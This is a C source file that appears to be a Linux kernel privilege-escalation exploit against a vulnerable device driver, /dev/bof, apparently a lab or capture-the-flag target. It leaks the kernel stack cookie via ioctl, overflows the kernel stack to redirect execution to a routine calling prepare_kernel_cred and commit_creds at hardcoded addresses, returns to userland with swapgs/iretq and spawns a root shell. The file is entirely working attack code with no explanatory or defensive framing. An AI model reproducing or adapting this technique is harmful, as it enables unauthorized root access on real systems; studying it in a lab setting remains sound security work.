#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024
#define MSG_SIZE 131

typedef struct read_write_stack{
	unsigned long size;
	long msg[MAX_MSG];
} read_write_stack;

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
        system("/bin/sh");
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "mov user_cs, cs;" // saving address of code segment
        "mov user_ss, ss;" // saving address of stack segment
        "mov user_sp, rsp;" // saving stack pointer
        "pushf;" // push flag register onto stack
        "pop user_rflags;" // saving flag register
        ".att_syntax;"        
    );
}

unsigned long user_rip = (unsigned long)spawn_shell;

void privesc(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "movabs rax, 0xffffffff81089f90;"  // prepare_kernel_cred 
        "xor rdi, rdi;" // 0 as parameter
        "call rax;" // calling prepare_kernel_cred
        "mov rdi, rax;" // setting the return to the parameter of commit_creds
        "movabs rax, 0xffffffff81089b50;" // commit_creds
        "call rax;" // calling commit_creds
        "swapgs;" // swapping the gs register
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;" // returning to user mode
        ".att_syntax;" // setting syntax back to at&t
    );
}

int main(){
	int fd;
	long ret;

	printf("[+] Opening device file...\n");
	fd = open("/dev/bof", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

	read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG * sizeof(long));
	receiver->size = 280;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)receiver);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		free(receiver);
		exit(-1);
	}

	printf("[+] Received message\n");
	printf("[+] Stack cookie: 0x%lx\n", receiver->msg[128]);

    long stack_cookie = receiver->msg[128];

    long dummy = 0x4444444444444444;
    long msg[MSG_SIZE];
    for(int i = 0; i < MSG_SIZE;i++){
        msg[i] = 0x4141414141414141;
    }

    msg[MSG_SIZE-3] = stack_cookie;
    receiver->size = MSG_SIZE * 2;
  
#ifdef TEST_RETURN
    char interrupts[50];
    for(int i = 0; i < 50; i++){
        interrupts[i] = 0xcc;
    }
    void *mem = mmap(0, sizeof(interrupts), PROT_EXEC|PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
    if((long)mem == -1){
        printf("[-] Could not perform mmap\n");
        perror("MMAP: ");
        exit(-1);
    }
    
    memcpy(mem, interrupts, sizeof(interrupts));
    printf("[+] Address of interrupt zone: 0x%p\n", mem);
#endif



    msg[MSG_SIZE - 2] = dummy;
    msg[MSG_SIZE - 1] = (unsigned long)privesc;

    for(int i = 0; i < MSG_SIZE; i++){
        receiver->msg[i] = msg[i];
    }

    save_state();
    printf("[+] State saved\n");

    printf("[+] Sending payload...\n");

    ret = ioctl(fd, WRITE_STACK, (unsigned long)receiver);
    if(ret < 0){
        printf("[-] Failed to write to kernel stack\n");
        free(receiver);
#ifdef TEST_RETURN
        munmap(mem, sizeof(interrupts));
#endif
        exit(-1);
    }    



	free(receiver);
#ifdef TEST_RETURN
	munmap(mem, sizeof(interrupts));
#endif
	return 0;
}
